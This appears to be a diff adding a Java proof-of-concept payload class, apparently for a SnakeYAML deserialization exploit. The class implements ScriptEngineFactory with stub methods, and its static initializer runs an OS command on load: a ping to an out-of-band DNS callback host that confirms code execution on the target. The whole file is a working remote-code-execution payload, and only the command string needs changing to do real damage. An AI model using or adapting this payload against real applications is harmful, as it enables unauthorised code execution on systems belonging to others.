@@ -1,0 +1,75 @@
+import javax.script.ScriptEngine;
+import javax.script.ScriptEngineFactory;
+import java.util.List;
+import java.io.IOException;
+
+public class PoC implements ScriptEngineFactory {
+    static {
+        try {
+            System.out.println("Test by cqq!");
+            Runtime.getRuntime().exec("ping yaml.95ccea33b8b00d36df0c.d.zhack.ca");
+        } catch (IOException e){
+            e.printStackTrace();
+        }
+    }
+
+    
+    public String getEngineName() {
+        return null;
+    }
+
+    
+    public String getEngineVersion() {
+        return null;
+    }
+
+    
+    public List<String> getExtensions() {
+        return null;
+    }
+
+    
+    public List<String> getMimeTypes() {
+        return null;
+    }
+
+    
+    public List<String> getNames() {
+        return null;
+    }
+
+    
+    public String getLanguageName() {
+        return null;
+    }
+
+    
+    public String getLanguageVersion() {
+        return null;
+    }
+
+    
+    public Object getParameter(String key) {
+        return null;
+    }
+
+    
+    public String getMethodCallSyntax(String obj, String m, String... args) {
+        return null;
+    }
+
+    
+    public String getOutputStatement(String toDisplay) {
+        return null;
+    }
+
+    
+    public String getProgram(String... statements) {
+        return null;
+    }
+
+    
+    public ScriptEngine getScriptEngine() {
+        return null;
+    }
+}
